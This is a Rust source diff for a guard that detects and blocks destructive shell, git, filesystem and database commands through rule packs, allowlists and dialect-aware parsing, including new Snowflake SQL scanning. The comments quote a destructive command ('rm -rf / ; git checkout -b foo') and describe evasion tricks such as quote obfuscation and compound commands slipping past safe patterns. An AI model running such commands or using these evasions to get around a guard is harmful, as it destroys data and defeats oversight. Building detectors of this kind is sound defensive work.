@@ -5436,16 +10712,66 @@ struct MaskedCommand {
     dynamic_markers: Vec<String>,
 }
 
-fn mask_command_substitutions(command: &str) -> MaskedCommand {
+fn mask_command_substitutions(command: &str) -> Result<MaskedCommand, String> {
+    let posix_substitutions = crate::heredoc::extract_posix_command_substitutions(command)
+        .map_err(|_| {
+            "POSIX command substitution could not be parsed without shell-grammar recovery"
+                .to_string()
+        })?;
+    for substitution in &posix_substitutions {
+        if substitution.start >= substitution.end
+            || substitution.end > command.len()
+            || !command.is_char_boundary(substitution.start)
+            || !command.is_char_boundary(substitution.end)
+        {
+            return Err(
+                "POSIX command-substitution AST returned an invalid source range".to_string(),
+            );
+        }
+    }
+
     let bytes = command.as_bytes();
     let mut masked = String::with_capacity(command.len());
     let mut substitutions = Vec::new();
     let mut dynamic_markers = Vec::new();
+    let mut substitution_index = 0usize;
     let mut index = 0usize;
     let mut in_single = false;
     let mut in_double = false;
     let windows_expansions = windows_variable_expansion_active(command);
     while index < bytes.len() {
+        if let Some(substitution) = posix_substitutions.get(substitution_index) {
+            if substitution.start < index {
+                return Err(
+                    "POSIX command-substitution AST returned overlapping source ranges".to_string(),
+                );
+            }
+            if substitution.start == index {
+                let marker = unique_substitution_marker(command, substitutions.len());
+                masked.push_str(&marker);
+                substitutions.push((marker, substitution.body.clone()));
+                index = substitution.end;
+                substitution_index += 1;
+                continue;
+            }
+        }
+        if !in_single
+            && !in_double
+            && bytes[index] == b'#'
+            && (index == 0
+                || bytes[index - 1].is_ascii_whitespace()
+                || matches!(
+                    bytes[index - 1],
+                    b';' | b'|' | b'&' | b'(' | b')' | b'<' | b'>'
+                ))
+        {
+            let comment_end = command[index..]
+                .find('\n')
+                .map_or(bytes.len(), |newline| index + newline);
+            masked.extend(std::iter::repeat_n(' ', comment_end - index));
+            index = comment_end;
+            continue;
+        }
         if windows_expansions && bytes[index] == b'^' && index + 1 < bytes.len() {
             let Some(escaped) = command[index + 1..].chars().next() else {
                 break;
@@ -5484,31 +10810,9 @@ fn mask_command_substitutions(command: &str) -> MaskedCommand {
                 index += 2;
                 continue;
             }
-            let Some(close) = find_substitution_close(command, index + 2) else {
-                let marker = unique_internal_marker(command, "UNCLOSED", dynamic_markers.len());
-                masked.push_str(&marker);
-                dynamic_markers.push(marker);
-                break;
-            };
-            let marker = unique_substitution_marker(command, substitutions.len());
-            masked.push_str(&marker);
-            substitutions.push((marker, command[index + 2..close].to_string()));
-            index = close + 1;
-            continue;
-        }
-        if !in_single && bytes[index] == b'`' {
-            let Some(relative_close) = command[index + 1..].find('`') else {
-                let marker = unique_internal_marker(command, "UNCLOSED", dynamic_markers.len());
-                masked.push_str(&marker);
-                dynamic_markers.push(marker);
-                break;
-            };
-            let close = index + 1 + relative_close;
-            let marker = unique_substitution_marker(command, substitutions.len());
-            masked.push_str(&marker);
-            substitutions.push((marker, command[index + 1..close].to_string()));
-            index = close + 1;
-            continue;
+            return Err(
+                "POSIX command substitution was not represented by the shell AST".to_string(),
+            );
         }
         if !in_single && bytes[index] == b'$' {
             let consumed = shell_parameter_expansion_len(&command[index..]);
@@ -5556,11 +10860,14 @@ fn mask_command_substitutions(command: &str) -> MaskedCommand {
         masked.push(ch);
         index += ch.len_utf8();
     }
-    MaskedCommand {
+    if substitution_index != posix_substitutions.len() {
+        return Err("POSIX command-substitution AST ranges were not consumed".to_string());
+    }
+    Ok(MaskedCommand {
         command: masked,
         substitutions,
         dynamic_markers,
-    }
+    })
 }
 
 fn unique_internal_marker(command: &str, kind: &str, index: usize) -> String {
@@ -5602,48 +10909,6 @@ fn unique_substitution_marker(command: &str, index: usize) -> String {
         marker.push('_');
     }
     marker
-}
-
-fn find_substitution_close(command: &str, start: usize) -> Option<usize> {
-    let bytes = command.as_bytes();
-    let mut depth = 1usize;
-    let mut index = start;
-    let mut in_single = false;
-    let mut in_double = false;
-    while index < bytes.len() {
-        let byte = bytes[index];
-        if byte == b'\\' && !in_single && index + 1 < bytes.len() {
-            index += 2;
-            continue;
-        }
-        if byte == b'\'' && !in_double {
-            in_single = !in_single;
-            index += 1;
-            continue;
-        }
-        if byte == b'"' && !in_single {
-            in_double = !in_double;
-            index += 1;
-            continue;
-        }
-        if in_single {
-            index += 1;
-            continue;
-        }
-        if byte == b'$' && bytes.get(index + 1) == Some(&b'(') {
-            depth += 1;
-            index += 2;
-            continue;
-        }
-        if byte == b')' && !in_double {
-            depth -= 1;
-            if depth == 0 {
-                return Some(index);
-            }
-        }
-        index += 1;
-    }
-    None
 }
 
 #[derive(Debug)]
@@ -5848,6 +11113,7 @@ struct NestedDatabaseFile {
 fn database_nested_file_references(
     pack_id: &str,
     payload: &str,
+    snowflake_local_only: bool,
 ) -> Result<Vec<NestedDatabaseFile>, String> {
     let mut references = Vec::new();
     match pack_id {
@@ -5918,6 +11184,31 @@ fn database_nested_file_references(
                         path: database_include_operand(pack_id, operand)?,
                         relative_to_parent: false,
                     });
+                }
+            }
+        }
+        "database.snowflake" => {
+            let sources = crate::packs::database::snowflake::source_references(payload)
+                .map_err(|error| error.reason)?;
+            for source in sources {
+                match source {
+                    crate::packs::database::snowflake::SnowflakeSource::Local(path) => {
+                        references.push(NestedDatabaseFile {
+                            path,
+                            // Upstream Snowflake CLI's statement reader passes
+                            // the directive operand directly to `SecurePath`;
+                            // it does not chdir to the containing SQL file.
+                            relative_to_parent: false,
+                        });
+                    }
+                    crate::packs::database::snowflake::SnowflakeSource::Remote(url)
+                        if !snowflake_local_only =>
+                    {
+                        return Err(format!(
+                            "a Snowflake source references remote input that cannot be inspected: {url}"
+                        ));
+                    }
+                    crate::packs::database::snowflake::SnowflakeSource::Remote(_) => {}
                 }
             }
         }
@@ -6568,7 +11859,7 @@ fn evaluate_indirect_inputs_for_pack(
         .filter(|flow| flow.pack_id == pack_id || flow.pack_id == "*")
     {
         if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
-            return Some(EvaluationResult::allowed_due_to_budget());
+            return Some(EvaluationResult::indeterminate_due_to_budget());
         }
 
         let resolved_roots = match resolve_indirect_inputs(&flow.source, project_path) {
@@ -6645,6 +11936,8 @@ fn evaluate_indirect_inputs_for_pack(
                 pack_id,
                 pack,
                 &work.payload,
+                flow.snowflake_templating,
+                flow.snowflake_retain_comments,
                 allowlists,
                 project_path,
                 first_allowlist_hit,
@@ -6696,8 +11989,10 @@ fn evaluate_indirect_inputs_for_pack(
                             keyword_index,
                             deadline,
                             project_path,
+                            crate::normalize::ShellDialect::Unknown,
                             embedded_shell_depth + 1,
                             None,
+                            false,
                         )
                     },
                     |context| {
@@ -6712,7 +12007,9 @@ fn evaluate_indirect_inputs_for_pack(
                             context.allow_once_audit,
                             project_path,
                             deadline,
+                            crate::normalize::ShellDialect::Unknown,
                             embedded_shell_depth + 1,
+                            context.inherited_automated_stdin,
                         )
                     },
                 );
@@ -6721,7 +12018,11 @@ fn evaluate_indirect_inputs_for_pack(
                 }
             }
 
-            let references = match database_nested_file_references(pack_id, &work.payload) {
+            let references = match database_nested_file_references(
+                pack_id,
+                &work.payload,
+                flow.snowflake_local_only,
+            ) {
                 Ok(references) => references,
                 Err(detail) => {
                     if let Some(result) = unverified_indirect_input_result(
@@ -6898,17 +12199,156 @@ fn evaluate_indirect_payload_patterns(
     pack_id: &str,
     pack: &crate::packs::Pack,
     payload: &str,
+    snowflake_templating: crate::packs::database::snowflake::SnowflakeTemplating,
+    snowflake_retain_comments: bool,
     allowlists: &LayeredAllowlist,
     project_path: Option<&Path>,
     first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
     deadline: Option<&Deadline>,
 ) -> Option<EvaluationResult> {
+    if pack_id == "database.snowflake" {
+        use crate::packs::Severity;
+        use crate::packs::database::snowflake::SnowflakeSqlReportScan;
+
+        let report = match crate::packs::database::snowflake::scan_sql_report_with_options(
+            payload,
+            snowflake_templating,
+            snowflake_retain_comments,
+        ) {
+            SnowflakeSqlReportScan::Safe => return None,
+            SnowflakeSqlReportScan::Unverified(error) => {
+                return unverified_indirect_input_result(
+                    pack_id,
+                    &error.reason,
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                );
+            }
+            SnowflakeSqlReportScan::Match(report) => report,
+        };
+
+        let mut unallowlisted = Vec::with_capacity(report.findings.len());
+        let mut summaries = Vec::with_capacity(report.findings.len());
+        for finding in &report.findings {
+            if deadline_exceeded(deadline) {
+                return Some(EvaluationResult::indeterminate_due_to_budget());
+            }
+            let Some(_) = payload.get(finding.statement_span.clone()) else {
+                return unverified_indirect_input_result(
+                    pack_id,
+                    "the Snowflake semantic scanner returned an invalid statement span",
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                );
+            };
+            let Some(pattern) = pack
+                .destructive_patterns
+                .iter()
+                .find(|pattern| pattern.name == Some(finding.pattern_name))
+            else {
+                return unverified_indirect_input_result(
+                    pack_id,
+                    "the Snowflake semantic scanner returned an unregistered rule",
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                );
+            };
+            let pattern_name = pattern.name.unwrap_or("unnamed");
+            let allowlist_hit = allowlists.match_rule_at_path(pack_id, pattern_name, project_path);
+            let status = if allowlist_hit.is_some() {
+                " (allowlisted)"
+            } else {
+                ""
+            };
+            let span = MatchSpan {
+                start: finding.statement_span.start,
+                end: finding.statement_span.end,
+            };
+            let preview = extract_match_preview(payload, &span).replace(['\r', '\n'], " ");
+            summaries.push(format!(
+                "- bytes {}..{} `{pattern_name}`{status}: {preview}",
+                finding.statement_span.start, finding.statement_span.end
+            ));
+
+            if let Some(hit) = allowlist_hit {
+                if first_allowlist_hit.is_none() {
+                    *first_allowlist_hit = Some((
+                        PatternMatch {
+                            pack_id: Some(pack_id.to_string()),
+                            pattern_name: pattern.name.map(str::to_string),
+                            severity: Some(pattern.severity),
+                            reason: pattern.reason.to_string(),
+                            source: MatchSource::Pack,
+                            matched_span: None,
+                            matched_text_preview: Some(preview.clone()),
+                            explanation: pattern.explanation.map(str::to_string),
+                            suggestions: pattern.suggestions,
+                        },
+                        hit.layer,
+                        hit.entry.reason.clone(),
+                    ));
+                }
+            } else {
+                unallowlisted.push((finding, pattern));
+            }
+        }
+
+        if unallowlisted.is_empty() {
+            return None;
+        }
+
+        let severity_rank = |severity: Severity| match severity {
+            Severity::Critical => 4,
+            Severity::High => 3,
+            Severity::Medium => 2,
+            Severity::Low => 1,
+        };
+        let (finding, pattern) = unallowlisted
+            .iter()
+            .copied()
+            .find(|(finding, _)| **finding == report.primary)
+            .or_else(|| {
+                unallowlisted
+                    .iter()
+                    .copied()
+                    .max_by_key(|(_, pattern)| severity_rank(pattern.severity))
+            })
+            .expect("a non-empty Snowflake report has a primary finding");
+        let pattern_name = pattern.name.unwrap_or("unnamed");
+        let mut result = EvaluationResult::denied_by_pack_pattern(
+            pack_id,
+            pattern_name,
+            pattern.reason,
+            pattern.explanation,
+            pattern.severity,
+            pattern.suggestions,
+        );
+        if let Some(info) = result.pattern_info.as_mut() {
+            let primary_span = MatchSpan {
+                start: finding.statement_span.start,
+                end: finding.statement_span.end,
+            };
+            info.matched_text_preview = Some(extract_match_preview(payload, &primary_span));
+            info.explanation = Some(format!(
+                "{}\n\nSnowflake semantic analysis found {} guarded statement(s) in source order; {} still require approval:\n{}",
+                pattern.explanation.unwrap_or(pattern.reason),
+                report.findings.len(),
+                unallowlisted.len(),
+                summaries.join("\n")
+            ));
+        }
+        return Some(result);
+    }
+
     for pattern in &pack.destructive_patterns {
         if pattern.name == Some(INDIRECT_INPUT_RULE) {
             continue;
         }
         if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
-            return Some(EvaluationResult::allowed_due_to_budget());
+            return Some(EvaluationResult::indeterminate_due_to_budget());
         }
         if !pattern.regex.is_match(payload) {
             continue;
@@ -6971,8 +12411,10 @@ fn evaluate_packs_with_allowlists(
         keyword_index,
         deadline,
         project_path,
+        crate::normalize::ShellDialect::Unknown,
         0,
         None,
+        false,
     )
 }
 
@@ -6988,11 +12430,13 @@ fn evaluate_packs_with_allowlists_at_depth(
     keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
     deadline: Option<&Deadline>,
     project_path: Option<&Path>,
+    shell_dialect: crate::normalize::ShellDialect,
     embedded_shell_depth: usize,
     nested_context: Option<&NestedCommandEvaluationContext<'_, '_>>,
+    inherited_automated_stdin: bool,
 ) -> EvaluationResult {
     if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
-        return EvaluationResult::allowed_due_to_budget();
+        return EvaluationResult::indeterminate_due_to_budget();
     }
 
     // Pre-compute which packs might match.
@@ -7003,6 +12447,42 @@ fn evaluate_packs_with_allowlists_at_depth(
     //
     // External packs from custom_paths are also checked alongside built-in packs.
     let external_store = crate::packs::get_external_packs();
+    // Generic normalization can legitimately rewrite quote syntax before this
+    // pack-selection pass (for example Bash `g$'i't`).  The caller-proven raw
+    // command is the authoritative place to decide whether dialect decoding
+    // may reveal a Git invocation; using the normalized view here would let
+    // the no-index path discard `core.git` before its semantic decoder runs.
+    let force_core_git = dialect_may_hide_core_git(original_command, shell_dialect, ordered_packs);
+    let force_core_filesystem = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "core.filesystem")
+        && crate::packs::core::filesystem::filesystem_semantic_scan_required(
+            original_command,
+            shell_dialect,
+        );
+    let force_windows_filesystem = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "windows.filesystem")
+        && crate::packs::windows::filesystem::windows_filesystem_semantic_scan_required(
+            original_command,
+            shell_dialect,
+        );
+    let force_cloudflare_workers = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "cdn.cloudflare_workers")
+        && crate::packs::cdn::cloudflare_workers::cloudflare_workers_semantic_scan_required(
+            original_command,
+            shell_dialect,
+        );
+    let force_snowflake = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "database.snowflake")
+        && crate::packs::database::snowflake::snowflake_semantic_scan_required(
+            original_command,
+            shell_dialect,
+        );
+    let force_literal_database_packs =
+        literal_substitution_database_packs(original_command, shell_dialect);
     let candidate_packs: Vec<(&String, &crate::packs::Pack)> = keyword_index.map_or_else(
         || {
             ordered_packs
@@ -7010,12 +12490,18 @@ fn evaluate_packs_with_allowlists_at_depth(
                 .filter_map(|pack_id| {
                     // Try built-in registry first
                     if let Some(entry) = REGISTRY.get_entry(pack_id) {
-                        if !entry.might_match(command_for_packs)
-                            && !should_check_original_control_plane_payload(
+                        if !(entry.might_match(command_for_packs)
+                            || force_core_git && pack_id == "core.git"
+                            || force_core_filesystem && pack_id == "core.filesystem"
+                            || force_cloudflare_workers && pack_id == "cdn.cloudflare_workers"
+                            || force_snowflake && pack_id == "database.snowflake"
+                            || force_literal_database_packs.contains(&pack_id.as_str())
+                            || force_windows_filesystem && pack_id == "windows.filesystem"
+                            || should_check_original_control_plane_payload(
                                 pack_id,
                                 command_for_packs,
                                 original_command,
-                            )
+                            ))
                         {
                             return None;
                         }
@@ -7046,12 +12532,18 @@ fn evaluate_packs_with_allowlists_at_depth(
                 .iter()
                 .enumerate()
                 .filter_map(|(i, pack_id)| {
-                    if (mask >> i) & 1 == 0
-                        && !should_check_original_control_plane_payload(
+                    if !((mask >> i) & 1 != 0
+                        || force_core_git && pack_id == "core.git"
+                        || force_core_filesystem && pack_id == "core.filesystem"
+                        || force_cloudflare_workers && pack_id == "cdn.cloudflare_workers"
+                        || force_snowflake && pack_id == "database.snowflake"
+                        || force_literal_database_packs.contains(&pack_id.as_str())
+                        || force_windows_filesystem && pack_id == "windows.filesystem"
+                        || should_check_original_control_plane_payload(
                             pack_id,
                             command_for_packs,
                             original_command,
-                        )
+                        ))
                     {
                         return None;
                     }
@@ -7071,32 +12563,103 @@ fn evaluate_packs_with_allowlists_at_depth(
         },
     );
 
-    let has_filesystem_pack = candidate_packs
-        .iter()
-        .any(|(pack_id, _)| pack_id.as_str() == "core.filesystem");
-    let rm_parse = has_filesystem_pack
-        .then(|| crate::packs::core::filesystem::parse_rm_command(command_for_packs));
-
     let normalized_offset = compute_normalized_offset(command_for_match, normalized);
     let original_len = original_command.len();
-    let segment_ranges = command_segment_ranges(command_for_packs);
+    let segment_ranges = command_segment_ranges_in_dialect(command_for_packs, shell_dialect);
     let has_compound_segments = segment_ranges.len() > 1;
-    let has_indirect_input_pack = candidate_packs.iter().any(|(pack_id, _)| {
-        matches!(
-            pack_id.as_str(),
-            "database.redis"
-                | "database.postgresql"
-                | "database.mysql"
-                | "database.mongodb"
-                | "database.sqlite"
-        )
-    });
+    // Semantic decoders for a caller-proven dialect need the original quoting
+    // and escape syntax, but they must not reinterpret literal stdin data as
+    // executable source. Keep the dialect-preserving view and mask only
+    // heredocs whose targets are proven not to execute their input.
+    let dialect_semantic_masked = crate::heredoc::mask_non_executing_heredocs(command_for_match);
+    // Generic normalization intentionally knows nothing about caller-proven
+    // shell dialects. In particular, treating Bash `$'...'` as ordinary quote
+    // concatenation can erase the syntax that the dialect decoder needs. Keep
+    // the length-preserving, sanitized raw command for core.git whenever the
+    // hook envelope proves a dialect; other packs continue to consume the
+    // established normalized view.
+    let core_git_command = if shell_dialect == crate::normalize::ShellDialect::Unknown {
+        command_for_packs
+    } else {
+        dialect_semantic_masked.as_ref()
+    };
+    let core_git_segment_ranges =
+        command_segment_ranges_in_dialect(core_git_command, shell_dialect);
+    let core_git_offset = if shell_dialect == crate::normalize::ShellDialect::Unknown {
+        normalized_offset
+    } else {
+        Some(0)
+    };
+    let core_filesystem_command = if shell_dialect == crate::normalize::ShellDialect::Unknown {
+        command_for_packs
+    } else {
+        dialect_semantic_masked.as_ref()
+    };
+    let core_filesystem_segment_ranges =
+        command_segment_ranges_in_dialect(core_filesystem_command, shell_dialect);
+    let core_filesystem_offset = if shell_dialect == crate::normalize::ShellDialect::Unknown {
+        normalized_offset
+    } else {
+        Some(0)
+    };
+    // Wrangler's semantic decoder needs the exact caller-proven quote and
+    // escape syntax (not generic normalization) to distinguish executable
+    // npm runner payloads and JavaScript entrypoints from inert argv data.
+    let cloudflare_workers_command = if shell_dialect == crate::normalize::ShellDialect::Unknown {
+        command_for_packs
+    } else {
+        dialect_semantic_masked.as_ref()
+    };
+    let cloudflare_workers_segment_ranges =
+        command_segment_ranges_in_dialect(cloudflare_workers_command, shell_dialect);
+    let cloudflare_workers_offset = if shell_dialect == crate::normalize::ShellDialect::Unknown {
+        normalized_offset
+    } else {
+        Some(0)
+    };
+    let has_indirect_input_pack = candidate_packs
+        .iter()
+        .any(|(pack_id, _)| is_indirect_database_pack(pack_id));
     let indirect_input_flows = if has_indirect_input_pack {
-        collect_indirect_input_flows(original_command, &command_segment_ranges(original_command))
+        let mut flows = collect_indirect_input_flows(
+            original_command,
+            &command_segment_ranges(original_command),
+            shell_dialect,
+        );
+        for flow in collect_dialect_snowflake_flows(
+            original_command,
+            shell_dialect,
+            command_segment_ranges_in_dialect(original_command, shell_dialect).len() > 1,
+        ) {
+            push_indirect_flow(&mut flows, flow);
+        }
+        flows
     } else {
         Vec::new()
     };
 
+    // A proven database client owns the semantics of its SQL payload. Generic
+    // SQL regexes from another enabled pack must not win first merely because
+    // that pack appears earlier in registry order (for example PostgreSQL's
+    // `DROP TABLE` rule matching the query inside `snow sql -q ...`). Besides
+    // producing the wrong recovery guidance, that cross-pack match would also
+    // re-block a statement explicitly allowlisted under its real client pack.
+    //
+    // Restrict this arbitration to exact flows whose pack is enabled. If the
+    // specialized pack is disabled, the historical conservative generic scan
+    // remains intact. Compound commands with multiple enabled database clients
+    // retain each exact client pack, in the caller's existing pack order.
+    let mut exact_enabled_indirect_packs = Vec::new();
+    for flow in &indirect_input_flows {
+        if flow.pack_id != "*"
+            && candidate_packs
+                .iter()
+                .any(|(pack_id, _)| pack_id.as_str() == flow.pack_id)
+            && !exact_enabled_indirect_packs.contains(&flow.pack_id)
+        {
+            exact_enabled_indirect_packs.push(flow.pack_id);
+        }
+    }
     // Single-pass per-pack evaluation: safe patterns only protect their own pack's
     // destructive patterns, not other packs. This prevents compound command bypass
     // where e.g., "git checkout -b foo" safe pattern would whitelist "rm -rf / ; git checkout -b foo".
@@ -7110,7 +12673,20 @@ fn evaluate_packs_with_allowlists_at_depth(
 
     for &(pack_id, pack) in &candidate_packs {
         if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
-            return EvaluationResult::allowed_due_to_budget();
+            return EvaluationResult::indeterminate_due_to_budget();
+        }
+
+        // For a single proven database-client invocation, only that client's
+        // enabled pack may interpret its embedded payload. In a compound shell
+        // command we retain every pack here because another segment may invoke
+        // a pack-specific command (for example `dropdb`); the per-segment gate
+        // below excludes only segments owned by a different proven client.
+        if !has_compound_segments
+            && is_indirect_database_pack(pack_id)
+            && !exact_enabled_indirect_packs.is_empty()
+            && !exact_enabled_indirect_packs.contains(&pack_id.as_str())
+        {
+            continue;
         }
 
         if let Some(result) = evaluate_indirect_inputs_for_pack(
@@ -7129,115 +12705,284 @@ fn evaluate_packs_with_allowlists_at_depth(
             return result;
         }
 
+        if pack_id == "windows.filesystem" {
+            match crate::packs::windows::filesystem::windows_filesystem_semantic_decision_in_dialect(
+                original_command,
+                shell_dialect,
+            ) {
+                crate::packs::windows::filesystem::WindowsFilesystemSemanticDecision::Safe => {
+                    continue;
+                }
+                crate::packs::windows::filesystem::WindowsFilesystemSemanticDecision::Destructive(
+                    name,
+                ) => {
+                    if let Some(result) = evaluate_named_pack_rule(
+                        pack_id,
+                        pack,
+                        name,
+                        allowlists,
+                        project_path,
+                        &mut first_allowlist_hit,
+                    ) {
+                        return result;
+                    }
+                    continue;
+                }
+                crate::packs::windows::filesystem::WindowsFilesystemSemanticDecision::Unverified => {
+                    if let Some(result) = evaluate_named_pack_rule(
+                        pack_id,
+                        pack,
+                        crate::packs::windows::filesystem::WINDOWS_FILESYSTEM_UNVERIFIED_RULE,
+                        allowlists,
+                        project_path,
+                        &mut first_allowlist_hit,
+                    ) {
+                        return result;
+                    }
+                    continue;
+                }
+                crate::packs::windows::filesystem::WindowsFilesystemSemanticDecision::NoMatch
+                    if matches!(shell_dialect, ShellDialect::PowerShell | ShellDialect::Cmd) =>
+                {
+                    // With caller-proven Windows syntax the bounded semantic
+                    // parser is authoritative about executable and option
+                    // roles. Falling through to a whole-string regex would
+                    // reinterpret inert arguments to a proven-safe command as
+                    // another executable (for example `& ('Write'+'-Output')
+                    // 'Clear-Content file'`). Unknown/POSIX callers retain the
+                    // conservative regex fallback because no Windows grammar
+                    // has been proven for them.
+                    continue;
+                }
+                crate::packs::windows::filesystem::WindowsFilesystemSemanticDecision::NoMatch => {}
+            }
+        }
+
         // Check safe patterns for this pack first.
         // If a safe pattern matches, skip this pack's destructive patterns only.
         // This prevents compound command bypass where one pack's safe pattern
         // would whitelist destructive commands from other packs.
         if pack_id == "core.filesystem" {
-            let has_pre_rm_propagation_match = pack.destructive_patterns.iter().any(|pattern| {
-                crate::packs::core::filesystem::is_pre_rm_propagation_rule(pattern.name)
-                    && pattern.regex.is_match(command_for_packs)
-            });
-
-            // core.filesystem uses rm_parse for more accurate safe pattern detection
-            match rm_parse.as_ref() {
-                Some(crate::packs::core::filesystem::RmParseDecision::Allow)
-                    if !has_pre_rm_propagation_match =>
-                {
-                    continue; // Safe pattern match - skip this pack
-                }
-                Some(crate::packs::core::filesystem::RmParseDecision::Allow) => {
-                    // A sensitive-source propagation chain matched before the rm
-                    // fast path. Fall through to the ordinary destructive-pattern
-                    // loop so allowlists, spans, explanations, and suggestions are
-                    // handled consistently.
-                }
-                Some(crate::packs::core::filesystem::RmParseDecision::NoMatch) | None => {
-                    // rm_parse didn't find rm command or wasn't computed, check safe patterns as fallback
-                    if pack.matches_safe_with_deadline(command_for_packs, deadline) {
-                        continue;
-                    }
-                }
-                Some(crate::packs::core::filesystem::RmParseDecision::Deny(hit)) => {
-                    if let Some(allow_hit) =
-                        allowlists.match_rule_at_path(pack_id, hit.pattern_name, project_path)
-                    {
-                        if first_allowlist_hit.is_none() {
-                            let span = hit.span.as_ref().map(|span| MatchSpan {
-                                start: span.start,
-                                end: span.end,
-                            });
-                            let mapped_span = span.and_then(|span| {
-                                map_span_with_offset(span, normalized_offset, original_len)
-                            });
-                            let preview = mapped_span
-                                .as_ref()
-                                .map(|span| extract_match_preview(original_command, span))
-                                .or_else(|| {
-                                    span.as_ref()
-                                        .map(|span| extract_match_preview(command_for_packs, span))
-                                });
-                            first_allowlist_hit = Some((
-                                PatternMatch {
-                                    pack_id: Some(pack_id.clone()),
-                                    pattern_name: Some(hit.pattern_name.to_string()),
-                                    severity: Some(hit.severity),
-                                    reason: hit.reason.to_string(),
-                                    source: MatchSource::Pack,
-                                    matched_span: mapped_span,
-                                    matched_text_preview: preview,
-                                    explanation: None,
-                                    suggestions: &[],
-                                },
-                                allow_hit.layer,
-                                allow_hit.entry.reason.clone(),
-                            ));
-                        }
-                        continue;
-                    }
-
-                    if let Some(span) = hit.span.as_ref().map(|span| MatchSpan {
-                        start: span.start,
-                        end: span.end,
-                    }) {
-                        if let Some(mapped_span) =
-                            map_span_with_offset(span, normalized_offset, original_len)
-                        {
-                            return EvaluationResult::denied_by_pack_pattern_with_span(
-                                pack_id,
-                                hit.pattern_name,
-                                hit.reason,
-                                None,
-                                hit.severity,
-                                &[], // fast_match path doesn't have suggestions
-                                original_command,
-                                mapped_span,
-                            );
-                        }
-                    }
-
-                    return EvaluationResult::denied_by_pack_pattern(
-                        pack_id,
-                        hit.pattern_name,
-                        hit.reason,
-                        None,
-                        hit.severity,
-                        &[], // fast_match path doesn't have suggestions
-                    );
+            if let Some(result) = evaluate_core_filesystem_pack(
+                pack_id,
+                pack,
+                core_filesystem_command,
+                shell_dialect,
+                &core_filesystem_segment_ranges,
+                original_command,
+                core_filesystem_offset,
+                original_len,
+                allowlists,
+                project_path,
+                &mut first_allowlist_hit,
+                deadline,
+                inherited_automated_stdin,
+            ) {
+                return result;
+            }
+            continue;
+        } else if pack_id == "cdn.cloudflare_workers" {
+            if let Some(result) = evaluate_cloudflare_workers_pack(
+                pack_id,
+                pack,
+                cloudflare_workers_command,
+                shell_dialect,
+                &cloudflare_workers_segment_ranges,
+                original_command,
+                cloudflare_workers_offset,
+                original_len,
+                ordered_packs,
+                keyword_index,
+                allowlists,
+                project_path,
+                &mut first_allowlist_hit,
+                deadline,
+                embedded_shell_depth,
+                nested_context,
+            ) {
+                return result;
+            }
+            continue;
+        } else if pack_id == "core.git" {
+            // In PowerShell, a leading `&` is an executable call operator, not
+            // a background separator. The generic segment tokenizer keeps it
+            // as a boundary for other pack logic, so preserve one whole-command
+            // semantic pass before evaluating the remaining segment ranges.
+            if shell_dialect == ShellDialect::PowerShell
+                && original_command
+                    .trim_start()
+                    .strip_prefix('&')
+                    .is_some_and(|tail| tail.chars().next().is_some_and(char::is_whitespace))
+            {
+                if let Some(result) = evaluate_pack_destructive_patterns(
+                    pack_id,
+                    pack,
+                    core_git_command,
+                    shell_dialect,
+                    0,
+                    original_command,
+                    core_git_offset,
+                    original_len,
+                    allowlists,
+                    project_path,
+                    &mut first_allowlist_hit,
+                    deadline,
+                    &[],
+                    None,
+                ) {
+                    return result;
                 }
             }
+            if core_git_segment_ranges.len() > 1 {
+                // The whole-command pass carries visible alias state across
+                // prior `git config`, `export`/`set`, and PowerShell `$env:`
+                // segments. Per-segment passes below still provide precise
+                // recursive handling when no cross-segment state is involved.
+                if let Some(result) = evaluate_visible_git_shell_alias(
+                    pack_id,
+                    pack,
+                    core_git_command,
+                    shell_dialect,
+                    ordered_packs,
+                    keyword_index,
+                    allowlists,
+                    project_path,
+                    &mut first_allowlist_hit,
+                    deadline,
+                    embedded_shell_depth,
+                    nested_context,
+                ) {
+                    return result;
+                }
+            }
+            if core_git_segment_ranges.len() > 1 {
+                for &(segment_start, segment_end) in &core_git_segment_ranges {
+                    if deadline_exceeded(deadline)
+                        || remaining_below(deadline, &crate::perf::PATTERN_MATCH)
+                    {
+                        return EvaluationResult::indeterminate_due_to_budget();
+                    }
+
+                    let segment = &core_git_command[segment_start..segment_end];
+                    if let Some(result) = evaluate_visible_git_shell_alias(
+                        pack_id,
+                        pack,
+                        segment,
+                        shell_dialect,
+                        ordered_packs,
+                        keyword_index,
+                        allowlists,
+                        project_path,
+                        &mut first_allowlist_hit,
+                        deadline,
+                        embedded_shell_depth,
+                        nested_context,
+                    ) {
+                        return result;
+                    }
+                    let safe_view =
+                        crate::packs::core::git::syntax_view_in_dialect(segment, shell_dialect);
+                    if pack.matches_safe_with_deadline(
+                        safe_view.as_deref().unwrap_or(segment),
+                        deadline,
+                    ) {
+                        continue;
+                    }
+
+                    let nested_segment_ranges: Vec<(usize, usize)> = core_git_segment_ranges
+                        .iter()
+                        .copied()
+                        .filter(|&(nested_start, nested_end)| {
+                            nested_start >= segment_start
+                                && nested_end <= segment_end
+                                && !(nested_start == segment_start && nested_end == segment_end)
+                        })
+                        .collect();
+
+                    if let Some(result) = evaluate_pack_destructive_patterns(
+                        pack_id,
+                        pack,
+                        segment,
+                        shell_dialect,
+                        segment_start,
+                        original_command,
+                        core_git_offset,
+                        original_len,
+                        allowlists,
+                        project_path,
+                        &mut first_allowlist_hit,
+                        deadline,
+                        &nested_segment_ranges,
+                        None,
+                    ) {
+                        return result;
+                    }
+                }
+            } else {
+                if let Some(result) = evaluate_visible_git_shell_alias(
+                    pack_id,
+                    pack,
+                    core_git_command,
+                    shell_dialect,
+                    ordered_packs,
+                    keyword_index,
+                    allowlists,
+                    project_path,
+                    &mut first_allowlist_hit,
+                    deadline,
+                    embedded_shell_depth,
+                    nested_context,
+                ) {
+                    return result;
+                }
